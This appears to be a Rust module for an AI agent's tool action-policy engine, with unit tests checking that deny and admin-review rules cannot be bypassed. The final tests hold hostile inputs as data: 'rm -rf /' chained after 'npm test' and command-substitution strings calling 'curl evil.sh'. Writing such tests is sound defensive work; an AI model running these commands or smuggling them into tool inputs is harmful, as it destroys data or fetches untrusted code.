//! Tool action-policy evaluation, command matching, and rule storage.

use async_trait::async_trait;
use globset::{Glob, GlobMatcher};
use moa_core::shell::{has_action_policy_unsafe_shell_syntax, split_shell_chain};
use moa_core::{
    ActionPolicyEffect, ActionPolicyRule, ActionRuleScope, MoaConfig, MoaError, Result,
    SessionMeta, TenantId, ToolPolicyInput, UserId,
};

/// Persistent action-policy rule storage used by policy-aware tool routing.
#[async_trait]
pub trait ActionPolicyRuleStore: Send + Sync {
    /// Lists action-policy rules visible to one tenant user and tool.
    async fn list_action_policy_rules_for_tool(
        &self,
        tenant_id: &TenantId,
        user_id: &UserId,
        tool: &str,
    ) -> Result<Vec<ActionPolicyRule>>;

    /// Creates or updates an action-policy rule after validating its glob pattern.
    async fn upsert_action_policy_rule(&self, rule: ActionPolicyRule) -> Result<()>;

    /// Deletes an action-policy rule by tool and pattern.
    async fn delete_action_policy_rule(
        &self,
        tenant_id: &TenantId,
        user_id: Option<&UserId>,
        tool: &str,
        pattern: &str,
    ) -> Result<()>;
}

/// Session-scoped inputs required for tool policy evaluation.
#[derive(Debug, Clone)]
pub struct ActionPolicyContext {
    /// Tenant associated with the current session.
    pub tenant_id: TenantId,
}

impl ActionPolicyContext {
    /// Creates a policy context from a session metadata record.
    pub fn from_session(session: &SessionMeta) -> Self {
        Self {
            tenant_id: session.tenant_id,
        }
    }
}

/// Result of evaluating one tool invocation against the current policy set.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ActionPolicyCheck {
    /// Effect to apply for this invocation.
    pub effect: ActionPolicyEffect,
    /// Optional human-readable reason for the decision.
    pub reason: Option<String>,
    /// Rule that matched, if any.
    pub matched_rule: Option<ActionPolicyRule>,
}

/// Policy engine for tool action decisions.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ActionPolicies {
    default_effect: ActionPolicyEffect,
    admin_review: Vec<String>,
    always_deny: Vec<String>,
}

impl ActionPolicies {
    /// Creates policies from the loaded MOA config.
    pub fn from_config(config: &MoaConfig) -> Result<Self> {
        let policies = Self {
            default_effect: config.permissions.default_effect,
            admin_review: config.permissions.admin_review.clone(),
            always_deny: config.permissions.always_deny.clone(),
        };
        policies.validate_config()?;
        Ok(policies)
    }

    /// Evaluates a tool invocation using persistent rules, config defaults, and tool metadata.
    pub fn check(
        &self,
        input: &ToolPolicyInput,
        ctx: &ActionPolicyContext,
        rules: &[ActionPolicyRule],
    ) -> Result<ActionPolicyCheck> {
        self.validate_config()?;
        validate_action_policy_rules(rules)?;

        let mut matched_rule: Option<ActionPolicyRule> = None;
        for rule in rules {
            if !rule_visible_to_context(rule, ctx) {
                continue;
            }
            if rule.tool != input.tool_name {
                continue;
            }
            if rule_matches(rule, &input.tool_name, &input.normalized_input)? {
                matched_rule = Some(match matched_rule {
                    Some(current)
                        if stricter_effect(current.effect, rule.effect) == current.effect =>
                    {
                        current
                    }
                    _ => rule.clone(),
                });
            }
        }

        let configured = self.configured_tool_effect(&input.tool_name)?;
        if let Some(rule) = matched_rule {
            let (effect, reason) = match configured {
                Some((configured_effect, configured_reason)) => {
                    let effect = stricter_effect(rule.effect, configured_effect);
                    let reason = if effect == configured_effect && effect != rule.effect {
                        Some(configured_reason)
                    } else {
                        rule.reason.clone()
                    };
                    (effect, reason)
                }
                None => (rule.effect, rule.reason.clone()),
            };
            return Ok(ActionPolicyCheck {
                effect,
                reason,
                matched_rule: Some(rule),
            });
        }

        if let Some((effect, reason)) = configured {
            return Ok(ActionPolicyCheck {
                effect,
                reason: Some(reason),
                matched_rule: None,
            });
        }

        let effect = stricter_effect(input.default_effect, self.default_effect);

        Ok(ActionPolicyCheck {
            effect,
            reason: None,
            matched_rule: None,
        })
    }

    fn configured_tool_effect(
        &self,
        tool_name: &str,
    ) -> Result<Option<(ActionPolicyEffect, String)>> {
        for candidate in &self.always_deny {
            if config_glob_matches("permissions.always_deny", candidate, tool_name)? {
                return Ok(Some((
                    ActionPolicyEffect::Deny,
                    "tool is denied by action-policy config".to_string(),
                )));
            }
        }

        for candidate in &self.admin_review {
            if config_glob_matches("permissions.admin_review", candidate, tool_name)? {
                return Ok(Some((
                    ActionPolicyEffect::AdminReview,
                    "tool requires tenant admin review by config".to_string(),
                )));
            }
        }

        Ok(None)
    }

    fn validate_config(&self) -> Result<()> {
        for pattern in &self.always_deny {
            validate_config_policy_glob("permissions.always_deny", pattern)?;
        }
        for pattern in &self.admin_review {
            validate_config_policy_glob("permissions.admin_review", pattern)?;
        }
        Ok(())
    }
}

impl Default for ActionPolicies {
    fn default() -> Self {
        Self {
            default_effect: ActionPolicyEffect::Allow,
            admin_review: Vec::new(),
            always_deny: Vec::new(),
        }
    }
}

/// Validates an action-policy glob pattern before persistence or evaluation.
pub fn validate_policy_glob(pattern: &str) -> Result<()> {
    compile_policy_glob(pattern).map(|_| ())
}

/// Validates one persisted action-policy rule before it is stored or evaluated.
pub fn validate_action_policy_rule(rule: &ActionPolicyRule) -> Result<()> {
    Glob::new(&rule.pattern).map(|_| ()).map_err(|error| {
        MoaError::ValidationError(format!(
            "invalid action-policy {} glob for tool `{}`: `{}` ({error})",
            rule.effect.as_str(),
            rule.tool,
            rule.pattern
        ))
    })
}

/// Validates persisted action-policy rules before they are stored or evaluated.
pub fn validate_action_policy_rules(rules: &[ActionPolicyRule]) -> Result<()> {
    for rule in rules {
        validate_action_policy_rule(rule)?;
    }
    Ok(())
}

/// Performs glob matching against a normalized tool input string.
pub fn glob_match(pattern: &str, candidate: &str) -> Result<bool> {
    Ok(compile_policy_glob(pattern)?.is_match(candidate))
}

fn compile_policy_glob(pattern: &str) -> Result<GlobMatcher> {
    Glob::new(pattern)
        .map(|glob| glob.compile_matcher())
        .map_err(|error| {
            MoaError::ValidationError(format!(
                "invalid action-policy glob pattern `{pattern}`: {error}"
            ))
        })
}

fn validate_config_policy_glob(field: &str, pattern: &str) -> Result<()> {
    Glob::new(pattern).map(|_| ()).map_err(|error| {
        MoaError::ConfigError(format!(
            "invalid action-policy config {field} glob pattern `{pattern}`: {error}"
        ))
    })
}

fn config_glob_matches(field: &str, pattern: &str, candidate: &str) -> Result<bool> {
    Glob::new(pattern)
        .map(|glob| glob.compile_matcher().is_match(candidate))
        .map_err(|error| {
            MoaError::ConfigError(format!(
                "invalid action-policy config {field} glob pattern `{pattern}`: {error}"
            ))
        })
}

/// Parses a shell command and matches it against a rule pattern.
pub fn parse_and_match_command(command: &str, rule_pattern: &str) -> Result<bool> {
    let matcher = compile_policy_glob(rule_pattern)?;

    if has_action_policy_unsafe_shell_syntax(command) {
        return Ok(false);
    }

    let sub_commands = split_shell_chain(command);
    if sub_commands.len() > 1 {
        return Ok(sub_commands
            .iter()
            .all(|sub_command| matcher.is_match(sub_command)));
    }

    Ok(shell_words::split(command)
        .map(|tokens| matcher.is_match(tokens.join(" ")))
        .unwrap_or_else(|_| matcher.is_match(command.trim())))
}

fn rule_visible_to_context(rule: &ActionPolicyRule, ctx: &ActionPolicyContext) -> bool {
    match rule.scope {
        ActionRuleScope::Tenant { tenant_id } => tenant_id == ctx.tenant_id,
    }
}

/// Returns the strictest outcome from two action-policy effects.
#[must_use]
pub fn stricter_effect(left: ActionPolicyEffect, right: ActionPolicyEffect) -> ActionPolicyEffect {
    match (left, right) {
        (ActionPolicyEffect::Deny, _) | (_, ActionPolicyEffect::Deny) => ActionPolicyEffect::Deny,
        (ActionPolicyEffect::AdminReview, _) | (_, ActionPolicyEffect::AdminReview) => {
            ActionPolicyEffect::AdminReview
        }
        (ActionPolicyEffect::Allow, ActionPolicyEffect::Allow) => ActionPolicyEffect::Allow,
    }
}

fn rule_matches(rule: &ActionPolicyRule, tool: &str, normalized_input: &str) -> Result<bool> {
    if tool == "bash" {
        return parse_and_match_command(normalized_input, &rule.pattern);
    }

    glob_match(&rule.pattern, normalized_input)
}

#[cfg(test)]
mod tests {
    use chrono::Utc;
    use moa_core::shell::split_shell_chain;
    use moa_core::{
        ActionPolicyEffect, ActionPolicyRule, ActionRuleScope, MoaConfig, MoaError, ModelId,
        RiskLevel, SessionMeta, TenantId, ToolPolicyInput, UserId,
    };
    use uuid::Uuid;

    use super::{
        ActionPolicies, ActionPolicyContext, glob_match, parse_and_match_command,
        validate_action_policy_rule,
    };

    fn tenant_id() -> TenantId {
        TenantId::from(Uuid::from_u128(42))
    }

    fn other_tenant_id() -> TenantId {
        TenantId::from(Uuid::from_u128(43))
    }

    fn session() -> SessionMeta {
        SessionMeta {
            tenant_id: tenant_id(),
            model: ModelId::new("claude-sonnet-4-6"),
            ..SessionMeta::default()
        }
    }

    #[test]
    fn tools_default_to_allow_in_auto_mode() {
        // Pins: auto mode executes policy-valid actions by default instead of blocking on review.
        let policies = ActionPolicies::default();
        let ctx = ActionPolicyContext::from_session(&session());

        let read = policies
            .check(
                &ToolPolicyInput {
                    tool_name: "file_read".to_string(),
                    normalized_input: "src/lib.rs".to_string(),
                    input_summary: "Path: src/lib.rs".to_string(),
                    risk_level: RiskLevel::Low,
                    default_effect: ActionPolicyEffect::Allow,
                    action_class: moa_core::ActionClass::Read,
                },
                &ctx,
                &[],
            )
            .unwrap();
        let bash = policies
            .check(
                &ToolPolicyInput {
                    tool_name: "bash".to_string(),
                    normalized_input: "npm test".to_string(),
                    input_summary: "Command: npm test".to_string(),
                    risk_level: RiskLevel::High,
                    default_effect: ActionPolicyEffect::Allow,
                    action_class: moa_core::ActionClass::CommandExecution,
                },
                &ctx,
                &[],
            )
            .unwrap();

        assert_eq!(read.effect, ActionPolicyEffect::Allow);
        assert_eq!(bash.effect, ActionPolicyEffect::Allow);
    }

    #[test]
    fn persistent_rule_matching_uses_glob_patterns() {
        // Pins: persisted action-policy rules can tighten the tool default effect.
        let policies = ActionPolicies::default();
        let ctx = ActionPolicyContext::from_session(&session());
        let rules = vec![ActionPolicyRule {
            id: Uuid::now_v7(),
            scope: ActionRuleScope::Tenant {
                tenant_id: tenant_id(),
            },
            tool: "file_write".to_string(),
            pattern: "src/*.rs".to_string(),
            effect: ActionPolicyEffect::AdminReview,
            reason: Some("review source edits".to_string()),
            created_by: UserId::new("user"),
            created_at: Utc::now(),
        }];

        let check = policies
            .check(
                &ToolPolicyInput {
                    tool_name: "file_write".to_string(),
                    normalized_input: "src/lib.rs".to_string(),
                    input_summary: "Path: src/lib.rs".to_string(),
                    risk_level: RiskLevel::Medium,
                    default_effect: ActionPolicyEffect::Allow,
                    action_class: moa_core::ActionClass::LocalWrite,
                },
                &ctx,
                &rules,
            )
            .unwrap();

        assert_eq!(check.effect, ActionPolicyEffect::AdminReview);
        assert_eq!(check.reason.as_deref(), Some("review source edits"));
        assert!(check.matched_rule.is_some());
    }

    #[test]
    fn malformed_policy_glob_match_returns_error() {
        // Pins: glob syntax errors are policy errors, not false non-matches.
        let error = glob_match("[", "src/lib.rs")
            .expect_err("malformed policy glob should return an error");

        assert!(
            matches!(error, MoaError::ValidationError(message) if message.contains("invalid action-policy glob pattern"))
        );
    }

    #[test]
    fn malformed_deny_rule_glob_is_policy_error_before_matching() {
        // Pins: malformed deny globs fail closed instead of silently missing and allowing the action.
        let policies = ActionPolicies::default();
        let ctx = ActionPolicyContext::from_session(&session());
        let rule = ActionPolicyRule {
            id: Uuid::now_v7(),
            scope: ActionRuleScope::Tenant {
                tenant_id: tenant_id(),
            },
            tool: "file_write".to_string(),
            pattern: "[".to_string(),
            effect: ActionPolicyEffect::Deny,
            reason: Some("deny source edits".to_string()),
            created_by: UserId::new("admin"),
            created_at: Utc::now(),
        };
        let validation_error = validate_action_policy_rule(&rule)
            .expect_err("malformed deny glob should be rejected before upsert");
        assert!(
            matches!(validation_error, MoaError::ValidationError(message) if message.contains("deny") && message.contains("file_write"))
        );

        let check = policies
            .check(
                &ToolPolicyInput {
                    tool_name: "file_write".to_string(),
                    normalized_input: "src/lib.rs".to_string(),
                    input_summary: "Path: src/lib.rs".to_string(),
                    risk_level: RiskLevel::Medium,
                    default_effect: ActionPolicyEffect::Allow,
                    action_class: moa_core::ActionClass::LocalWrite,
                },
                &ctx,
                &[rule],
            )
            .expect_err("malformed deny glob should fail policy evaluation");

        assert!(
            matches!(check, MoaError::ValidationError(message) if message.contains("deny") && message.contains("file_write"))
        );
    }

    #[test]
    fn malformed_review_rule_glob_is_policy_error_before_matching() {
        // Pins: malformed admin-review globs fail closed instead of silently skipping review.
        let policies = ActionPolicies::default();
        let ctx = ActionPolicyContext::from_session(&session());
        let rule = ActionPolicyRule {
            id: Uuid::now_v7(),
            scope: ActionRuleScope::Tenant {
                tenant_id: tenant_id(),
            },
            tool: "bash".to_string(),
            pattern: "[".to_string(),
            effect: ActionPolicyEffect::AdminReview,
            reason: Some("review deploys".to_string()),
            created_by: UserId::new("admin"),
            created_at: Utc::now(),
        };
        let validation_error = validate_action_policy_rule(&rule)
            .expect_err("malformed admin-review glob should be rejected before upsert");
        assert!(
            matches!(validation_error, MoaError::ValidationError(message) if message.contains("admin_review") && message.contains("bash"))
        );

        let check = policies
            .check(
                &ToolPolicyInput {
                    tool_name: "bash".to_string(),
                    normalized_input: "cargo test".to_string(),
                    input_summary: "Command: cargo test".to_string(),
                    risk_level: RiskLevel::High,
                    default_effect: ActionPolicyEffect::Allow,
                    action_class: moa_core::ActionClass::CommandExecution,
                },
                &ctx,
                &[rule],
            )
            .expect_err("malformed admin-review glob should fail policy evaluation");

        assert!(
            matches!(check, MoaError::ValidationError(message) if message.contains("admin_review") && message.contains("bash"))
        );
    }

    #[test]
    fn malformed_deny_config_glob_is_rejected_at_policy_construction() {
        // Pins: deployment deny config is validated before a policy engine is built.
        let mut config = MoaConfig::default();
        config.permissions.always_deny = vec!["[".to_string()];

        let error = ActionPolicies::from_config(&config)
            .expect_err("malformed deny config glob should fail policy construction");

        assert!(
            matches!(error, MoaError::ConfigError(message) if message.contains("permissions.always_deny"))
        );
    }

    #[test]
    fn malformed_review_config_glob_is_rejected_at_policy_construction() {
        // Pins: deployment admin-review config is validated before a policy engine is built.
        let mut config = MoaConfig::default();
        config.permissions.admin_review = vec!["[".to_string()];

        let error = ActionPolicies::from_config(&config)
            .expect_err("malformed review config glob should fail policy construction");

        assert!(
            matches!(error, MoaError::ConfigError(message) if message.contains("permissions.admin_review"))
        );
    }

    #[test]
    fn configured_tool_policy_uses_valid_glob_patterns() {
        // Pins: deployment-level deny config can use a valid tool-name glob.
        let mut config = MoaConfig::default();
        config.permissions.always_deny = vec!["file_*".to_string()];
        let policies = ActionPolicies::from_config(&config)
            .expect("valid config glob should build an action policy");
        let ctx = ActionPolicyContext::from_session(&session());

        let check = policies
            .check(
                &ToolPolicyInput {
                    tool_name: "file_write".to_string(),
                    normalized_input: "src/lib.rs".to_string(),
                    input_summary: "Path: src/lib.rs".to_string(),
                    risk_level: RiskLevel::Medium,
                    default_effect: ActionPolicyEffect::Allow,
                    action_class: moa_core::ActionClass::LocalWrite,
                },
                &ctx,
                &[],
            )
            .expect("valid config glob should evaluate");

        assert_eq!(check.effect, ActionPolicyEffect::Deny);
        assert_eq!(
            check.reason.as_deref(),
            Some("tool is denied by action-policy config")
        );
        assert!(check.matched_rule.is_none());
    }

    #[test]
    fn strictest_matching_persistent_rule_wins() {
        // Pins: broad allow rules cannot shadow a stricter matching rule.
        let policies = ActionPolicies::default();
        let ctx = ActionPolicyContext::from_session(&session());
        let rules = vec![
            ActionPolicyRule {
                id: Uuid::now_v7(),
                scope: ActionRuleScope::Tenant {
                    tenant_id: tenant_id(),
                },
                tool: "bash".to_string(),
                pattern: "git *".to_string(),
                effect: ActionPolicyEffect::Allow,
                reason: Some("allow git".to_string()),
                created_by: UserId::new("admin"),
                created_at: Utc::now(),
            },
            ActionPolicyRule {
                id: Uuid::now_v7(),
                scope: ActionRuleScope::Tenant {
                    tenant_id: tenant_id(),
                },
                tool: "bash".to_string(),
                pattern: "git push".to_string(),
                effect: ActionPolicyEffect::Deny,
                reason: Some("deny pushes".to_string()),
                created_by: UserId::new("admin"),
                created_at: Utc::now(),
            },
        ];

        let check = policies
            .check(
                &ToolPolicyInput {
                    tool_name: "bash".to_string(),
                    normalized_input: "git push".to_string(),
                    input_summary: "Command: git push".to_string(),
                    risk_level: RiskLevel::High,
                    default_effect: ActionPolicyEffect::Allow,
                    action_class: moa_core::ActionClass::CommandExecution,
                },
                &ctx,
                &rules,
            )
            .expect("policy evaluation");

        assert_eq!(check.effect, ActionPolicyEffect::Deny);
        assert_eq!(check.reason.as_deref(), Some("deny pushes"));
        assert_eq!(
            check.matched_rule.expect("matched rule").pattern,
            "git push"
        );
    }

    #[test]
    fn tenant_scoped_rules_only_match_the_current_tenant() {
        // Pins: a tenant action-policy override must not affect other tenants.
        let policies = ActionPolicies::default();
        let rule = ActionPolicyRule {
            id: Uuid::now_v7(),
            scope: ActionRuleScope::Tenant {
                tenant_id: tenant_id(),
            },
            tool: "bash".to_string(),
            pattern: "git push".to_string(),
            effect: ActionPolicyEffect::Deny,
            reason: Some("target tenant only".to_string()),
            created_by: UserId::new("admin"),
            created_at: Utc::now(),
        };
        let input = ToolPolicyInput {
            tool_name: "bash".to_string(),
            normalized_input: "git push".to_string(),
            input_summary: "Command: git push".to_string(),
            risk_level: RiskLevel::High,
            default_effect: ActionPolicyEffect::Allow,
            action_class: moa_core::ActionClass::CommandExecution,
        };

        let other_session = SessionMeta {
            tenant_id: other_tenant_id(),
            model: ModelId::new("claude-sonnet-4-6"),
            ..SessionMeta::default()
        };
        let other_check = policies
            .check(
                &input,
                &ActionPolicyContext::from_session(&other_session),
                std::slice::from_ref(&rule),
            )
            .expect("policy evaluation for other user");
        assert_eq!(other_check.effect, ActionPolicyEffect::Allow);
        assert!(other_check.matched_rule.is_none());

        let target_session = SessionMeta {
            tenant_id: tenant_id(),
            model: ModelId::new("claude-sonnet-4-6"),
            ..SessionMeta::default()
        };
        let target_check = policies
            .check(
                &input,
                &ActionPolicyContext::from_session(&target_session),
                &[rule],
            )
            .expect("policy evaluation for target user");
        assert_eq!(target_check.effect, ActionPolicyEffect::Deny);
        assert!(target_check.matched_rule.is_some());
    }

    #[test]
    fn default_policy_uses_the_stricter_config_or_tool_effect() {
        // Pins: config default deny/admin-review cannot be weakened by a permissive tool default, and stricter tool defaults still win.
        let ctx = ActionPolicyContext::from_session(&session());
        let input = ToolPolicyInput {
            tool_name: "external_write".to_string(),
            normalized_input: "deploy production".to_string(),
            input_summary: "deploy production".to_string(),
            risk_level: RiskLevel::High,
            default_effect: ActionPolicyEffect::Allow,
            action_class: moa_core::ActionClass::Deployment,
        };

        let admin_review_policy = ActionPolicies {
            default_effect: ActionPolicyEffect::AdminReview,
            admin_review: Vec::new(),
            always_deny: Vec::new(),
        };
        assert_eq!(
            admin_review_policy
                .check(&input, &ctx, &[])
                .expect("policy check")
                .effect,
            ActionPolicyEffect::AdminReview
        );

        let deny_policy = ActionPolicies {
            default_effect: ActionPolicyEffect::Deny,
            admin_review: Vec::new(),
            always_deny: Vec::new(),
        };
        let tool_admin_review = ToolPolicyInput {
            default_effect: ActionPolicyEffect::AdminReview,
            ..input
        };
        assert_eq!(
            deny_policy
                .check(&tool_admin_review, &ctx, &[])
                .expect("policy check")
                .effect,
            ActionPolicyEffect::Deny
        );
    }

    #[test]
    fn configured_tool_policy_cannot_be_weakened_by_persisted_allow_rule() {
        // Pins: deployment-level deny/review config is a floor, not a tenant-rule suggestion.
        let policies = ActionPolicies {
            default_effect: ActionPolicyEffect::Allow,
            admin_review: Vec::new(),
            always_deny: vec!["bash".to_string()],
        };
        let ctx = ActionPolicyContext::from_session(&session());
        let allow_rule = ActionPolicyRule {
            id: Uuid::now_v7(),
            scope: ActionRuleScope::Tenant {
                tenant_id: tenant_id(),
            },
            tool: "bash".to_string(),
            pattern: "git status".to_string(),
            effect: ActionPolicyEffect::Allow,
            reason: Some("allow status".to_string()),
            created_by: UserId::new("admin"),
            created_at: Utc::now(),
        };

        let check = policies
            .check(
                &ToolPolicyInput {
                    tool_name: "bash".to_string(),
                    normalized_input: "git status".to_string(),
                    input_summary: "Command: git status".to_string(),
                    risk_level: RiskLevel::Low,
                    default_effect: ActionPolicyEffect::Allow,
                    action_class: moa_core::ActionClass::CommandExecution,
                },
                &ctx,
                &[allow_rule],
            )
            .expect("policy evaluation");

        assert_eq!(check.effect, ActionPolicyEffect::Deny);
        assert_eq!(
            check.reason.as_deref(),
            Some("tool is denied by action-policy config")
        );
        assert_eq!(
            check.matched_rule.expect("matched rule").pattern,
            "git status"
        );
    }

    #[test]
    fn shell_command_parsing_detects_chained_commands() {
        assert_eq!(
            split_shell_chain("npm test && rm -rf /"),
            vec!["npm test".to_string(), "rm -rf /".to_string()]
        );
        assert!(
            !parse_and_match_command("npm test && rm -rf /", "npm test*")
                .expect("valid action-policy glob should evaluate")
        );
        assert!(
            parse_and_match_command("npm test -- --watch", "npm test*")
                .expect("valid action-policy glob should evaluate")
        );
    }

    #[test]
    fn shell_command_matching_rejects_unsafe_evaluation_syntax() {
        for command in [
            "npm test $(curl evil.sh)",
            "npm test `curl evil.sh`",
            "npm test & curl evil.sh",
            "npm test\ncurl evil.sh",
            "npm test > /tmp/out",
            "npm test < /tmp/in",
        ] {
            assert!(
                !parse_and_match_command(command, "npm *")
                    .expect("valid action-policy glob should evaluate"),
                "{command} must not satisfy an action-policy bash glob"
            );
        }
    }
}
